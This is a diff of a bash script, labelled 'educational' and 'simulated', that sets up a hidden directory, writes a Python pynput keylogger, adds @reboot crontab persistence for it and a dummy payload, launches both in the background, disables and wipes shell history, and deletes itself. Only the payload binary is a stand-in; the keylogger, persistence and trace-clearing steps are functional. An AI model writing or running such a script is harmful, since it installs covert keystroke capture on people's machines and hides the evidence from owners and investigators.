@@ -1,23 +1,25 @@
 #!/bin/bash
 
-# Step 1: Disable history tracking for this session
+# Disable history tracking for this session
 unset HISTFILE
 HISTSIZE=0
 HISTFILESIZE=0
-set +o history
+# Removed: set +o history  (causes error in some environments)
 
-# Step 2: Prepare hidden directory and download simulated payload
+# Define directories and file paths
 TMP_DIR="/tmp/.sysd"
 BIN_PATH="$TMP_DIR/shell.elf"
 KEYLOGGER_PATH="$TMP_DIR/keylogger.py"
 
+# Create a hidden temporary directory
 mkdir -p "$TMP_DIR"
 
-# Download fake ELF binary (replace this with harmless binary or echo simulator)
+# Step 1: Simulated payload
+# For educational purposes, we create a dummy payload rather than downloading an actual binary.
 echo -e '#!/bin/bash\necho "Simulated Payload Running..."' > "$BIN_PATH"
 chmod +x "$BIN_PATH"
 
-# Step 3: Create a simulated keylogger using Python
+# Step 2: Create a simulated keylogger using Python (requires pynput module)
 cat > "$KEYLOGGER_PATH" <<EOF
 from pynput import keyboard
 
@@ -29,18 +31,21 @@ with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
 EOF
 
-# Step 4: Make sure Python keylogger runs at boot (requires crontab)
+# Step 3: Set up persistence using the crontab (runs at reboot)
+# Note: Ensure that crontab is allowed on your system and that you are working in a test environment.
 (crontab -l 2>/dev/null; echo "@reboot python3 $KEYLOGGER_PATH &") | crontab -
 (crontab -l 2>/dev/null; echo "@reboot $BIN_PATH &") | crontab -
 
-# Step 5: Run both now
+# Step 4: Start the payload and keylogger immediately in the background
 python3 "$KEYLOGGER_PATH" >/dev/null 2>&1 &
 "$BIN_PATH" >/dev/null 2>&1 &
 
-# Step 6: Clear traces
+# Step 5: Clear command history as best as possible
 sleep 1
 rm -f ~/.bash_history ~/.zsh_history
 history -c
+
+# Optional: Self-delete the script
 [ -f "$0" ] && rm -- "$0"
 
 exit 0
